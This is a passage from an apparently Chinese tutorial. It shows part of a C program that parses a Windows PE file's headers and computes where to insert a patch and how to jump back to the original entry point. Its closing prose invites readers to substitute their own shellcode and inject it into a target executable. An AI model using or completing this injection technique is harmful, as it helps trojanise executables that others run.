
```
  ddHeaderAndSectionSize = e_lfanew + sizeof(IMAGE_NT_HEADERS32)+wNumberOfSection*sizeof(IMAGE_SECTION_HEADER);  

  //计算补丁起始地址 FOA  

  ddPatchFOA = ddHeaderAndSectionSize+11*16;  

  //计算实用补丁程序大小  

  dwPatchSize =  ddtextFileOffset - ddPatchFOA;  

  //计算原始程序入口 RVA 与新的入口 RVA 之间跳转时的 XX  

    ddAddressOfEntryPointXX = ddAddressOfEntryPoint -(ddPatchFOA+dwPatchSize);  

    //如果不需要输出原程序的信息，可以将下面的输出注释起来  

  printf("原程序绝对路径: %s\n",cObjectFile);  

  printf("e_lfanew=0x%x\n",e_lfanew);  

  printf("Address of Entry Point = 0x%x \n",ddAddressOfEntryPoint);  

  printf("ddSectionAlignment = 0x%x \n",ddSectionAlignment);  

  printf("ddFileAlignment = 0x%x \n",ddFileAlignment);  

  printf("ddSegmentOffset = 0x%x \n",ddSegmentOffset);  

  printf("Number Of Section = %d \n",wNumberOfSection);  

  printf("ddNumberOfRvaAndSizes = %d \n",ddNumberOfRvaAndSizes);  

  printf("====================节表==============================\n");  

  printf("%s 文件中的偏移: 0x%x\n",ddtextName,ddtextFileOffset);  

  printf("      文件中对齐后的尺寸: 0x%x\n",ddtextSizeOfRawData);  

  printf("      节的 RVA: 0x%x\n",ddtextRVA);  

  printf("====================调试信息==============================\n");  

  printf("补丁的文件偏移: 0x%x\n",ddPatchFOA);  

  delete szOldFile;  

  CloseHandle(h);  

}  

void main(int argc,char* argv[])  

{  

  GetPEInformation_C(cObjectFile);  

  ModifyExe_C(cObjectFile);  

}
```

读者可将待用补丁字节码数组中的字节码换成自己喜欢的`shellcode`，运行本程序，就可以把`shellcode`以补丁的形式插入目标文件中。

请读者注意：本程序在`Windows XP SP2 VC6.0`下编译通过，可能在其他的环境下不兼容，程序无法正常运行，我没有测试过。

上传的附件

| ![](img/67af4f1ef9c98996f43e89e749c7dcf5.jpg) | | `ModifyPE_C.rar` | | |
